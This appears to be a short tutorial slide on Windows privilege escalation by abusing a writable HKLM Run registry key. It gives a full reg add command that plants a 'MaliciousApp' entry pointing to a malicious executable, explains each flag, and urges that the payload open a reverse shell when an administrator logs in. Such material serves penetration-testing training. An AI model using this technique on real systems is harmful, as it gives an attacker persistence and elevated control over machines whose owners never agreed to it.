Injecting Malicious Entries with `reg add`

Adding your payload to a vulnerable AutoRun Registry key.

The `reg add` Command

  • •Native Windows utility for adding new Registry keys or entries.
  • •Used to inject paths to malicious executables.
  • •Requires write permissions on the target key.
Key Takeaway

Successfully using `reg add` on a vulnerable HKLM key can lead to privilege escalation upon next login/reboot.

Command Example
# Add a malicious entry to HKLM Run
# (Requires write permissions to the key)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousApp" /t REG_SZ /d "C:\Temp\malicious.exe" /f

# Explanation of flags:
# /v: Specifies the value name (e.g., MaliciousApp)
# /t: Specifies the data type (e.g., REG_SZ for string)
# /d: Specifies the data for the value (e.g., path to executable)
# /f: Forces overwrite if the entry already exists

Triggering the Payload

After injecting the entry, the malicious executable will run when the system reboots or when any user, including an administrator, logs in. This is the critical moment for privilege escalation. Ensure your payload is designed to establish a reverse shell or perform other actions to confirm successful exploitation.
